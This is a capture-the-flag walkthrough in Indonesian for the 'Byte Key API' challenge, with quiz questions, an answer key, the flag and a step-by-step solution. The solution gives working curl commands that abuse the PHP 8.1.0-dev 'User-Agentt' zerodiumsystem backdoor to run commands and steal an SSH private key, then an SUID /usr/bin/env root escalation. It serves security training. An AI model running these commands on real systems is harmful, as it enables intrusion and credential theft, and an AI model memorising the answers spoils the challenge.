# Byte Key API
## Desc
> Author: ariaf

Sebuah API internal masih berjalan memakai build PHP development yang berbahaya. Celah pada service web dapat memberikan akses awal, tetapi itu belum cukup untuk mengambil flag. Temukan jalan masuk ke SSH, lalu lanjutkan enumerasi sebagai user biasa untuk melakukan privilege escalation.

> Catatan: cari vulnerability pada web API terlebih dahulu, lalu gunakan informasi yang ditemukan untuk masuk ke SSH.

## Chall
### Question
1. Versi PHP berapa yang digunakan oleh aplikasi website?
2. Header HTTP apa yang dapat dimanfaatkan untuk menjalankan command pada target?
3. User awal setelah command execution berhasil siapa?
4. Di mana path SSH private key yang bocor?

> Format: /path/to/key
5. User SSH apa yang bisa dipakai dengan key tersebut?
6. Tool Linux paling simple apa yang bisa dipakai untuk mencari file SUID?
7. Binary SUID apa yang bisa dipakai untuk privilege escalation?

> Format: /path/to/binary
8. Apa nama website yang bisa dipakai untuk mencari cara abuse binary SUID tersebut?
9. Di mana path final flag?

> Format: /path/to/flag.txt
10. Apa isi flag?

### Answer
1. PHP 8.1.0-dev
2. User-Agentt
3. www-data
4. /home/ariaf/id_rsa
5. ariaf
6. find
7. /usr/bin/env
8. GTFOBins
9. /root/flag.txt
10. NFCTF{pHp_b4ckd00r_t0_5u1d_3nv}

## Run
```bash
docker compose up --build
```

Buka service di:

```text
http://localhost:8001
ssh://localhost:2222
```

## Solution
Cek service API terlebih dahulu.

```bash
URL=https://2477-103-154-150-103.ngrok-free.app/
curl -i $URL
```

Service memakai PHP 8.1.0-dev yang memiliki backdoor pada header `User-Agentt`. Header tersebut dapat menjalankan command melalui pola `zerodiumsystem(...)`.

```bash
curl -H "User-Agentt: zerodiumsystem('id');" -i $URL
```

Command berjalan sebagai `www-data`. Cari file menarik di home user, lalu ambil private key yang bocor.

```bash
curl -s -H "User-Agentt: zerodiumsystem('ls -la /home/');" $URL
curl -s -H "User-Agentt: zerodiumsystem('ls -la /home/ariaf');" $URL
curl -s -H "User-Agentt: zerodiumsystem('cat /home/ariaf/id_rsa');" $URL > id_rsa
chmod 600 id_rsa
```

Gunakan key tersebut untuk login SSH sebagai `ariaf`.

```bash
HOST=egpgx-103-154-150-103.run.pinggy-free.link
PORT=43619
ssh -i id_rsa ariaf@$HOST -p $PORT
```

Setelah masuk SSH, cari binary SUID. Tool paling simple untuk ini adalah `find`.

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/lib/openssh/ssh-keysign
# /usr/bin/chsh
# /usr/bin/chfn
# /usr/bin/newgrp
# /usr/bin/passwd
# /usr/bin/env
# /usr/bin/gpasswd
# /bin/umount
# /bin/mount
# /bin/su
# /bin/ping
```

Ada `/usr/bin/env` yang memiliki SUID root dan bisa dieksekusi oleh user `ariaf`. Cek GTFOBins untuk pola abuse `env`, lalu spawn shell root.

```bash
/usr/bin/env /bin/sh -p
whoami
# root
id
# uid=1000(ariaf) gid=1000(ariaf) euid=0(root) groups=1000(ariaf)
cat /root/flag.txt
# NFCTF{pHp_b4ckd00r_t0_5u1d_3nv}
```

## Flag
NFCTF{pHp_b4ckd00r_t0_5u1d_3nv}
